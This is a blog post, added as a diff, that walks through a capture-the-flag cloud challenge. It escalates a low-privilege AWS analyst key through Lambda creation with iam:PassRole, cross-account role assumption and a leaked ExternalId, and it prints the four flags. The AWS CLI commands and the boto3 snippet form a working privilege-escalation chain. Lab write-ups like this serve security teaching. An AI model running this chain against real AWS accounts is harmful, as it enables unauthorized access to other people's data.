@@ -1,0 +1,275 @@
+---
+layout: post
+title:  "Cloud Challenges"
+date:   2026-09-28 16:55:00 -0400
+author: uzi
+tags: [CTF]
+permalink: /h7-ctf-2026-cloud/
+---
+
+## Deputy
+
+**Category**: cloud
+
+**Author**: abu
+
+**Description**: DeputyCorp is a cloud deployment partner your company integrated with. You've been handed a low-privilege analyst key into their account. Find out how far a careless integration really lets you go. Four flags, deeper each stage.
+
+Endpoint: `http://<your-instance-host>:<port>`
+
+`aws_access_key_id = redacted`  
+`aws_secret_access_key = redacted`  
+`region = redacted`
+
+Configure the aws creds:
+```shell
+export AWS_ACCESS_KEY_ID=redacted  
+
+export AWS_SECRET_ACCESS_KEY=redacted
+
+export AWS_DEFAULT_REGION=redacted
+
+export AWS_ENDPOINT_URL=https://web-aa14c750cc4724e1.web.h7tex.com:443
+```
+
+I started checking some common things (s3 buckets, permissions, etc):
+```shell
+aws sts get-caller-identity  
+{  
+	"UserId": "AIDAANALYST",  
+	"Account": "111111111111",  
+	"Arn": "arn:aws:iam::111111111111:user/analyst"  
+}
+
+aws s3 ls  
+2026-01-01 19:00:00 deputy-analyst-scratch  
+2026-01-01 19:00:00 deputy-runner-logs  
+2026-01-01 19:00:00 deputy-flag-vault  
+2026-01-01 19:00:00 deputy-crown-vault
+```
+
+The `s3 ls` helper returned empty output for the scratch bucket so I query the api directly:
+```shell
+aws s3api list-objects-v2 --bucket deputy-analyst-scratch --output text  
+None    None    None  
+CONTENTS        welcome.txt
+```
+
+Download `welcome.txt`:
+```shell
+aws s3api get-object --bucket deputy-analyst-scratch --key welcome.txt welcome.txt  
+{  
+	"ContentLength": 199,  
+	"ContentType": "text/plain",  
+	"Metadata": {}  
+}  
+
+cat welcome.txt  
+Welcome, analyst.  
+H7CTF{d6cc592f5a2f3db80718}  
+Onboarding: our deploys run through a Lambda that executes as ci-runner-role.  
+Check what YOU can do (get your inline policy) and what the runner can do.
+```
+
+Checking `ci-runner-role` permissions:
+```shell
+aws iam get-role-policy --role-name ci-runner-role --policy-name ci-runner-permissions  
+{  
+"RoleName": "ci-runner-role",  
+"PolicyName": "ci-runner-permissions",  
+"PolicyDocument": {  
+"Version": "2012-10-17",  
+"Statement": [  
+{  
+"Effect": "Allow",  
+"Action": [  
+"sts:AssumeRole"  
+],  
+"Resource": "arn:aws:iam::999999999999:role/partner-admin-role"  
+},  
+{  
+"Effect": "Allow",  
+"Action": [  
+"s3:GetObject",  
+"s3:ListBucket"  
+],  
+"Resource": [  
+"arn:aws:s3:::deputy-runner-logs",  
+"arn:aws:s3:::deputy-runner-logs/*"  
+]  
+},  
+{  
+"Effect": "Allow",  
+"Action": [  
+"logs:*"  
+],  
+"Resource": "*"  
+}  
+]  
+}  
+}
+```
+`ci-runner-role` can read `deputy-runner-logs` and can assume `arn:aws:iam::999999999999:role/partner-admin-role`. 
+
+I created a Lambda as `ci-runner-role` and read the `deputy-runner-logs` bucket:
+```shell
+cat p.py
+import boto3
+def h(e, c):
+    s3 = boto3.client("s3")
+    keys = [o["Key"] for o in s3.list_objects_v2(Bucket="deputy-runner-logs").get("Contents", [])]
+    out = {"keys": keys}
+    for k in keys:
+        try: out[k] = s3.get_object(Bucket="deputy-runner-logs", Key=k)["Body"].read().decode()
+        except Exception as ex: out[k] = "ERR: " + str(ex)
+    return out
+
+zip -o p.zip p.py  
+  adding: p.py (deflated 36%)
+```
+My analyst policy allowed `lambda:CreateFunction`, `lambda:InvokeFunction`, and `iam:PassRole` on `ci-runner-role`. So I created a function that runs as that role and prints its own credentials.
+
+Upload and run it:
+```shell
+aws lambda create-function --function-name ctf-p --runtime python3.12 --role arn:aws:iam::111111111111:role/ci-runner-role --handler p.h --zip-file fileb://p.zip  
+{  
+	"FunctionName": "ctf-p",  
+	"FunctionArn": "arn:aws:lambda:us-east-1:111111111111:function:ctf-p",  
+	"Runtime": "python3.12",  
+	"Role": "arn:aws:iam::111111111111:role/ci-runner-role",  
+	"Handler": "p.h",  
+	"State": "Active"  
+}  
+
+aws lambda invoke --function-name ctf-p out.json --cli-binary-format raw-in-base64-out --payload '{}'  
+{  
+	"StatusCode": 200  
+}
+```
+
+```shell
+cat out.json  
+{"message": "function executed; the execution role's environment credentials follow", "AWS_ACCESS_KEY_ID": "redacted", "AWS_SECRET_ACCESS_KEY": "redacted", "AWS_SESSION_TOKEN": "redacted", "role": "arn:aws:iam::111111111111:role/ci-runner-role"}
+```
+
+Use the runners credentials:
+```shell
+export AWS_ACCESS_KEY_ID=redacted
+
+export AWS_SECRET_ACCESS_KEY=redacted
+
+export AWS_SESSION_TOKEN=redacted
+```
+
+```shell
+aws s3api list-objects-v2 --bucket deputy-runner-logs --output text  
+None    None    None  
+CONTENTS        build.log
+
+aws s3api get-object --bucket deputy-runner-logs --key build.log build.log  
+{  
+	"ContentLength": 80,  
+	"ContentType": "text/plain",  
+	"Metadata": {}  
+}
+
+cat build.log  
+[ci-runner-role] nightly deploy ok  
+internal marker: H7CTF{28f87391f8a228110839}
+```
+
+With the runner creds, I found admin creds:
+```shell
+aws sts assume-role --role-arn arn:aws:iam::999999999999:role/partner-admin-role --role-session-name ctf  
+{  
+"Credentials": {  
+"AccessKeyId": "redacted",  
+"SecretAccessKey": "redacted",  
+"SessionToken": "redacted",  
+"Expiration": "2026-09-26T21:24:33+00:00"  
+},  
+"AssumedRoleUser": {  
+"AssumedRoleId": "AROAPARTNERADMINROLE:ctf",  
+"Arn": "arn:aws:sts::999999999999:assumed-role/partner-admin-role/ctf"  
+}  
+}
+```
+
+Use them:
+```shell
+export AWS_ACCESS_KEY_ID=redacted
+
+export AWS_SECRET_ACCESS_KEY=redacted
+ 
+export AWS_SESSION_TOKEN=redacted
+```
+
+```shell
+aws s3api list-objects-v2 --bucket deputy-flag-vault --output text  
+None    None    None  
+CONTENTS        flag  
+CONTENTS        partner-config.json
+
+aws s3api get-object --bucket deputy-flag-vault --key flag flag
+
+aws s3api get-object --bucket deputy-flag-vault --key partner-config.json partner-config.json
+
+cat partner-config.json  
+{  
+  "partner": "DeputyCorp",  
+  "secure_role": "arn:aws:iam::999999999999:role/partner-secure-role",  
+  "external_id": "Dc-2026-8f31a97c4b2e",  
+  "note": "partner-secure-role is our HARDENED role \u2014 callers must pass this ExternalId."  
+}
+
+cat flag  
+H7CTF{ea3e1dba8012d76e2648}
+```
+
+Now I can use the `ExternalId` to assume the hardened role:
+```shell
+aws sts assume-role --role-arn arn:aws:iam::999999999999:role/partner-secure-role --role-session-name secure --external-id Dc-2026-8f31a97c4b2e  
+{  
+"Credentials": {  
+"AccessKeyId": "redacted",  
+"SecretAccessKey": "redacted",  
+"SessionToken": "redacted",  
+"Expiration": "2026-09-26T21:36:35+00:00"  
+},  
+"AssumedRoleUser": {  
+"AssumedRoleId": "AROAPARTNERSECUREROLE:secure",  
+"Arn": "arn:aws:sts::999999999999:assumed-role/partner-secure-role/secure"  
+}  
+}
+```
+
+export the creds:
+```shell
+export AWS_ACCESS_KEY_ID=redacted
+
+export AWS_SECRET_ACCESS_KEY=redacted
+
+export AWS_SESSION_TOKEN=redacted
+```
+
+Download the flag from the `deputy-crown-vault` bucket!
+```shell
+aws s3api list-objects-v2 --bucket deputy-crown-vault --output text  
+None    None    None  
+CONTENTS        flag  
+
+aws s3api get-object --bucket deputy-crown-vault --key flag flag  
+{  
+	"ContentLength": 28,  
+	"ContentType": "text/plain",  
+	"Metadata": {}  
+}  
+
+cat flag  
+H7CTF{1dbe909840d15aabdd63}
+```
+
+`H7CTF{d6cc592f5a2f3db80718}`
+`H7CTF{28f87391f8a228110839}`
+`H7CTF{ea3e1dba8012d76e2648}`
+`H7CTF{1dbe909840d15aabdd63}`
